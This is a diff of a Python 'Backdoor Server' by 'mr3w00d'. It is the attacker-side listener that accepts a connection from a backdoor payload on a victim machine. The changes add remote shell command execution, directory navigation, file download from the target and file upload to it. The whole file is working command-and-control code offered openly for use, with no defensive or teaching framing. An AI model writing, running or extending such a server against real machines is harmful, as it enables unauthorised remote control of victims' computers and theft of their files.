@@ -1,195 +1,288 @@
-import os
-import socket, json
+"""
+Backdoor Server
+---------------
+written by mr3w00d, 2022
+
+The backdoor server listens for connection from a backdoor payload. 
+
+When connected to a backdoor, the server will first check the connection by requesting the
+current working directory for the backdoor. When response is recived, the connection is confirmed.
+
+When connection is confirmed, the server can execute commands.
+
+The server has three kinds of commands:
+    - bdserver commands : local commands for bdserver only
+    - shell commands    : commands executed in the target shell
+    - app commands      : commands for the backdoor application
+
+App and Shell commands are sendt as an encoded jsonString from the RequestData object
+All requests require a response from backdoor. Responses are parsed as a ResponseData Object
+
+"""
+
+from modules.ResponseData import ResponseData
+from modules.RequestData import RequestData
+import socket, os
+
 
 # Default settings for ip and port
 DEFAULT_IP      = "192.168.0.16"
 DEFAULT_PORT    = 5555
+# debug setting
+DEBUG           = True
 
-
+# log data to console
 def log_info(text):
     """ print info to terminal"""
     print("[*] {}".format(text))
-
 def log_success(text):
     """ print success info to terminal"""
     print("[+] {}".format(text))
-
 def log_failure(text):
     """log failure to terminal"""
     print("[-] {}".format(text))
 
 
-class RequestData:
-    """
-        Hold request data for backdoor.
-        Contain method for extracting encoded json for socket send
-    """
-
-    # default constructor
-    def __init__(self, command, is_request = False):
-        self.is_request = is_request    # if true, command is for application, else for shell
-        self.command    = command       # command for app or shell
-
-    def jsonEncoded(self) -> bytes:
-        """ Method for extracting data as encoded json string """
-
-        jsonData = json.dumps(self, default=lambda x: x.__dict__, sort_keys=True, indent=4)
-        return jsonData.encode()
-
-class ResponseData:
-    """ Parse and hold response data from json response """
-
-    def __init__(self, responseJson) -> None:
-        self.has_output = responseJson["has_output"]
-        self.out        = responseJson["out"]
-        self.err        = responseJson["err"]
-        self.cwd        = responseJson["cwd"]
-
 
 class BackdoorServer:
     """
-        Backdoor server class.
-        Set ip and port as args and run
+    Backdoor Server Class
+
+    @param ip (string) : server ip
+    @param port (int) : server port
     """
 
-    # default constructor
     def __init__(self, ip, port) -> None:
 
         # create adress for socet
         self._address = (ip, port)
 
         # create IPv4, tct socket and bind to adress
-        self._SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._SOCK.bind(self._address)
+        self.__SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.__SOCK.bind(self._address)
 
-        self._target     = None      # hold target socket
-        self._target_ip  = None      # hold target ip adress
-        self._target_cwd = None      # hold target current working directory
-
-        self._local_commands = ["clear"]
+        self.__target     = None      # hold target socket
+        self.__target_ip  = None      # hold target ip adress
+        self.__target_cwd = None      # hold target current working directory
 
 
-    # run method for appication
     def run(self):
 
         print("\n   ---   STARTING BACKDOOR SERVER =>  {}:{}   ---\n".format(self._address[0], self._address[1]))
 
         # listen for connection
-        self._SOCK.listen(5)
+        self.__SOCK.listen(5)
         log_info("Waiting for connection...")
 
         # accept connection from target
-        self._target, self._target_ip = self._SOCK.accept()
-        log_info("Connecting {}".format(self._target_ip))
+        self.__target, self.__target_ip = self.__SOCK.accept()
+        log_info("Connecting {}".format(self.__target_ip))
 
-        self._first_connect()
+        # check connection
+        self.__first_connect()
 
-        print("\n")
+        # communicate with target
+        self.__target_comm()
 
-        self._commander()
 
-        self._SOCK.detach()
-        self._SOCK.close()
-    
+    def disconnect_target(self):
+        """ tell backdoor to disconnect from application """
+        req = RequestData("app", "exit")
+        self.__send(req)
 
-    def _commander(self):
-        """ handle user inputs and manage commands"""
 
+    def __first_connect(self):
+        """ test first connection by asking backdoor for current working directory """
+
+        req = RequestData("app","getcwd")
+        self.__send(req)
+
+        res = self.__recive()
+        self.__target_cwd = res.cwd
+        log_success("Connected {}".format(self.__target_ip))
+
+
+    def __target_comm(self):
+        """ handles communication with target"""
         while True:
+            cmd_string = " ~{}\n {}> ".format(self.__target_ip, self.__target_cwd)
+            command = input(cmd_string)
 
-            # get user input
-            command = input(" ~{}\n {}> ".format(self._target_ip, self._target_cwd))
-        
-            # handle exit commands first
-            if command in ["exit","quit"]:
-                self.disconnect()
-                log_info("Disconnected {}".format(self._target_ip))
+            # handle exit backdoor
+            if command[:4] in ['quit','exit']:
+                self.disconnect_target()
                 break
 
-            # handle bdserver commands (local commands)
-            if command.split(" ")[0] == "bdserver":
-                self._handle_local_command(command[9:])
+            # handle clear console
+            if command == "clear":
+                os.system("cls")
                 continue
 
-            if command in self._local_commands:
-                self._handle_local_command(command)
+            # handle dir navigation
+            if command[:2] == "cd":
+                req = RequestData("app", command)
+                self.__send(req)
+                res = self.__recive()
+                if res.err:
+                    print(res.err)
+                else:
+                    self.__target_cwd = res.cwd
                 continue
             
-            # handle shell commands
-            self._target_communicate(command)
+            # handle download command
+            if command[:8] == "download":
+                self.__download(command)
+                continue
+
+            # handle upload command
+            if command[:6] == "upload":
+                self.__upload(command)
+                continue
 
 
-    def _first_connect(self):
-        """ establish first connection to verify, getting backdoor working directory """
+            # handle local commands
+            if command[:8] == "bdserver":
+                if command == "bdserver help":
+                    self.__print_help()
+                    continue
 
-        request = RequestData("getcwd", True)
-        self._send(request)
-        response = self._recive()
-        self._target_cwd = response.cwd
-        log_success("Connected {}".format(self._target_ip))
+                log_failure("\"{}\" is not a valid command. Try \"bdserver help\" for documentation")
+                continue
+            
 
+            # handle other commands as shell commands
+            req = RequestData("shell", command)
+            self.__send(req)
 
-    def disconnect(self):
-        """ send exit command to shell, also use if app fails """
-        request = RequestData("exit", True)
-        self._send(request)
-
-
-    def _target_communicate(self, command):
-        """ handle all target communications"""
-
-        # DEV :: check for keywords for application commands
-
-        # send to target shell if no special app command
-        self._target_shell_command(command)
+            res = self.__recive()
+            
+            if res.out:
+                print(res.out)
+            if res.err:
+                print(res.err)
 
 
-    def _target_shell_command(self, command):
-        """ handle target shell commands """
+    def __send(self, data) -> None:
+        """ 
+        Encode and sendt data 
         
-        request = RequestData(command)
-        self._send(request)
-        response = self._recive()
-        
-        print(response.out)
-        if (response.err):
-            print(response.err)
-        self._target_cwd = response.cwd
+        @param data (Request) : Request object for data transfer
+        """
 
+        encodedData = data.encode_data()
+        self.__target.send(encodedData)
+    
 
-    def _target_app_request(self, command):
-        """ handle target application requests """
-        pass
+    def __recive(self) -> ResponseData:
+        """
+        Recive response from target and returns ResponseData object
+        """
 
-    def _handle_local_command(self, command):
-        """ handle local commands"""
-
-        if command == "clear":
-            os.system("cls")
-            return
-
-
-    def _send(self, data):
-        """transform data object to encoded json string and sends"""
-        request = data.jsonEncoded()
-        self._target.send(request)
-
-
-    def _recive(self) -> ResponseData:
-        """recive response and parse to object"""
-        
         data = ""
         while True:
-            try: 
-                data += self._target.recv(1024).decode().rstrip()
-                data = json.loads(data)
-                return ResponseData(data)
+            try:
+                data += self.__target.recv(1024).decode().rstrip()
+                res = ResponseData()
+                res.parse_json(data)
+                return res
             except ValueError:
                 continue
 
-                
+    
+    def __download(self, command):
+        """
+        Send download command to target and recives file.
+        
+        @param command (string) : download command
+        """
+
+        req = RequestData("app", command)
+        file_name = command[9:]
+
+        self.__send(req)
+
+        res = self.__recive()
+
+        if not res.out == "exist":
+            log_failure(f"{file_name} does not exist in current directory")
+            return
+
+        with open(file_name, "wb") as file:
+            self.__target.settimeout(1)
+            chunk = self.__target.recv(1024)
+
+            while chunk:
+
+                print(chunk)
+                file.write(chunk)
+                try:
+                    chunk = self.__target.recv(1024)
+                except socket.timeout:
+                    break
+            
+            self.__target.settimeout(None)
+ 
+
+    def __upload(self, command):
+        """
+        Upload file from server to shell working directory 
+        
+        @param command (string) : command
+        """
+        
+        file_name = command[7:]
+        exist = os.path.exists(file_name)
+
+        if not exist:
+            log_failure(f"{file_name} does not exist in server selected folder...")
+            return
+
+        req = RequestData("app",command)
+        self.__send(req)
+
+        # and send file
+        with open(file_name, "rb") as file:
+            self.__target.send(file.read())
+
+
+    def __print_help(self):
+        """Print help text for application"""
+
+        print("help")
+
+        text = """
+
+    Backdoor Server Help
+    --------------------
+
+    Use target os shell command to interact with target.
+    Other target commands are listed below
+
+    Target commands:
+    ----------------------
+
+    download .... : download file from shell working directory ( set file name )
+    upload ...... : upload file to shell working directory     ( set file name )
+
+
+    server commands
+    ---------------
+
+    bdserver help ........ : this help file
+
+"""
+        print(text)
+
+
 
 if __name__ == "__main__":
 
     server = BackdoorServer(DEFAULT_IP, DEFAULT_PORT)
-    server.run()
+
+    if not DEBUG:
+        try:
+            server.run()
+        except:
+            log_failure("An error occured, server closed down...")
+    else:
+        server.run() 
